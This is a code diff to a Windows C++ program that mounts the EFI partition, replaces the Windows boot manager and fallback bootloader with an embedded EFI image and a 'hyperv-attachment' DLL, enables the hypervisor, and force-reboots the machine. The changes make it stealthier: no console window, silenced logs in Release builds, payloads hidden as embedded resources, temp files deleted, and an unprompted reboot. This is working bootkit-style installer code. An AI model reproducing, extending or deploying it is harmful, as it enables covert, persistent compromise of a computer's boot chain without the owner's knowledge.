@@ -1,19 +1,53 @@
 #include <windows.h>
 #include <iostream>
 #include <string>
-#include <shlobj.h> // Để dùng SHCreateDirectoryExA
+#include <shlobj.h>
 #include <chrono>
 #include <iomanip>
 #include <ctime>
+#include <fstream>
+#include <vector>
+#include "resource.h"
 
 #pragma comment(lib, "Shell32.lib")
+#pragma comment(lib, "User32.lib")
+
+// --- LINKER CONFIG: WINDOWS FOR RELEASE, CONSOLE FOR DEBUG ---
+#ifdef _DEBUG
+#pragma comment(linker, "/SUBSYSTEM:CONSOLE")
+#else
+#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
+#endif
 
 void print_log(const std::string& msg) {
+#ifdef _DEBUG
     auto now = std::chrono::system_clock::now();
     auto in_time_t = std::chrono::system_clock::to_time_t(now);
     std::tm bt;
     localtime_s(&bt, &in_time_t);
     std::cout << "[" << std::put_time(&bt, "%H:%M:%S") << "] " << msg << std::endl;
+#else
+    // Pure silence in Release mode
+    (void)msg;
+#endif
+}
+
+bool extract_resource(int resId, const std::string& outPath) {
+    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(resId), RT_RCDATA);
+    if (!hRes) return false;
+
+    HGLOBAL hGlobal = LoadResource(NULL, hRes);
+    if (!hGlobal) return false;
+
+    void* pData = LockResource(hGlobal);
+    DWORD size = SizeofResource(NULL, hRes);
+
+    std::ofstream outFile(outPath, std::ios::binary);
+    if (!outFile.is_open()) return false;
+
+    outFile.write((const char*)pData, size);
+    outFile.close();
+    return true;
 }
 
 bool is_admin() {
@@ -38,33 +72,13 @@ bool aggressive_copy(const std::string& src, const std::string& dst) {
     system(("attrib -s -h -r \"" + dst + "\" >nul 2>&1").c_str());
     DeleteFileA(dst.c_str());
     if (CopyFileA(src.c_str(), dst.c_str(), FALSE)) {
+#ifdef _DEBUG
         print_log("[+] SUCCESS: Updated " + dst);
+#endif
         return true;
     }
-    print_log("[-] FAILED: Could not update " + dst + " (Error: " + std::to_string(GetLastError()) + ")");
+    print_log("[-] ERROR: Could not update " + dst);
     return false;
-}
-
-void verify_with_api(const std::string& path) {
-    WIN32_FIND_DATAA data;
-    HANDLE h = FindFirstFileA(path.c_str(), &data);
-    if (h != INVALID_HANDLE_VALUE) {
-        SYSTEMTIME stUTC, stLocal;
-        FileTimeToSystemTime(&data.ftLastWriteTime, &stUTC);
-        SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal);
-
-        char time_str[32];
-        sprintf_s(time_str, "%02d/%02d/%d %02d:%02d:%02d",
-            stLocal.wDay, stLocal.wMonth, stLocal.wYear,
-            stLocal.wHour, stLocal.wMinute, stLocal.wSecond);
-
-        print_log("[VERIFIED] " + std::string(data.cFileName) + 
-                  " | Size: " + std::to_string(data.nFileSizeLow) + 
-                  " bytes | Time: " + std::string(time_str));
-        FindClose(h);
-    } else {
-        print_log("[NOT FOUND] File error: " + path + " (Error: " + std::to_string(GetLastError()) + ")");
-    }
 }
 
 int main() {
@@ -73,31 +87,34 @@ int main() {
         return 0;
     }
 
-    // Ổ B cố định theo yêu cầu
     std::string drive_str = "B:";
-
-    print_log("[*] Cleaning up drive " + drive_str + " (if exists)...");
     system(("mountvol " + drive_str + " /D >nul 2>&1").c_str());
     Sleep(500);
 
+#ifdef _DEBUG
     print_log("[*] Mounting EFI to " + drive_str + "...");
+#endif
     system(("mountvol " + drive_str + " /S").c_str());
     Sleep(1000);
 
-    // Kiểm tra xem ổ đã thực sự được mount chưa
     if (GetFileAttributesA(drive_str.c_str()) == INVALID_FILE_ATTRIBUTES) {
-        print_log("[-] ERROR: Failed to mount EFI partition to " + drive_str + ".");
-        print_log("[!] Hay chac chan rang o B: khong bi chiem dung boi thiet bi khac.");
-        system("pause");
+        print_log("[-] ERROR: Failed to mount EFI partition.");
         return 1;
     }
 
-    char current_dir[MAX_PATH];
-    GetCurrentDirectoryA(MAX_PATH, current_dir);
-    std::string bin_path(current_dir);
-    
-    std::string src_efi = bin_path + "\\uefi-boot.efi";
-    std::string src_dll = bin_path + "\\hyperv-attachment.dll";
+    // Temporary extraction paths
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    std::string efiTemp = std::string(tempPath) + "uefi_boot_temp.efi";
+    std::string dllTemp = std::string(tempPath) + "attach_temp.dll";
+
+#ifdef _DEBUG
+    print_log("[*] Extracting embedded resources...");
+#endif
+    if (!extract_resource(IDR_EFI_BOOT, efiTemp) || !extract_resource(IDR_ATTACH_DLL, dllTemp)) {
+        print_log("[-] ERROR: Failed to extract embedded components.");
+        return 1;
+    }
 
     std::string ms_dir  = drive_str + "\\EFI\\Microsoft\\Boot";
     std::string ms_boot = ms_dir + "\\bootmgfw.efi";
@@ -108,7 +125,6 @@ int main() {
     std::string fb_boot = fb_dir + "\\bootx64.efi";
     std::string fb_orig = fb_dir + "\\bootx64.original.efi";
 
-    // Đảm bảo cấu trúc thư mục tồn tại
     SHCreateDirectoryExA(NULL, ms_dir.c_str(), NULL);
     SHCreateDirectoryExA(NULL, fb_dir.c_str(), NULL);
 
@@ -116,32 +132,34 @@ int main() {
     if (GetFileAttributesA(ms_orig.c_str()) == INVALID_FILE_ATTRIBUTES) {
         MoveFileA(ms_boot.c_str(), ms_orig.c_str());
     }
-    aggressive_copy(src_efi, ms_boot);
-    aggressive_copy(src_dll, ms_dll);
+    aggressive_copy(efiTemp, ms_boot);
+    aggressive_copy(dllTemp, ms_dll);
 
     // Backup & Copy Path 2
     if (GetFileAttributesA(fb_boot.c_str()) != INVALID_FILE_ATTRIBUTES) {
         if (GetFileAttributesA(fb_orig.c_str()) == INVALID_FILE_ATTRIBUTES) {
             MoveFileA(fb_boot.c_str(), fb_orig.c_str());
         }
-        aggressive_copy(src_efi, fb_boot);
+        aggressive_copy(efiTemp, fb_boot);
     } else {
-        aggressive_copy(src_efi, fb_boot);
+        aggressive_copy(efiTemp, fb_boot);
     }
 
     system("bcdedit /set hypervisorlaunchtype auto >nul 2>&1");
-    system("bcdedit /set {fwbootmgr} displayorder {bootmgr} /addfirst >nul 2>&1");
+    // No user-facing logs in Release mode for total silence
+#ifdef _DEBUG
+    print_log("[+] SUCCESS: UEFI BOOT REGISTRY UPDATED.");
+    print_log("[!] RESTARTING SYSTEM IN 5 SECONDS...");
+#endif
 
-    std::cout << "\n";
-    print_log("[OK] BOOT UPDATED. Verifying Result:");
-    verify_with_api(ms_boot);
-    verify_with_api(ms_dll);
-    verify_with_api(fb_boot);
-    
-    std::cout << "\n";
-    print_log("[!] RESTART NOW. Press any key to unmount and exit...");
-    system("pause >nul");
+    // Cleanup temp files
+    DeleteFileA(efiTemp.c_str());
+    DeleteFileA(dllTemp.c_str());
 
     system(("mountvol " + drive_str + " /D >nul 2>&1").c_str());
+
+    // FORCE REBOOT: /r = reboot, /t 5 = 5 seconds delay, /f = force close apps
+    system("shutdown /r /t 5 /f");
+    
     return 0;
 }
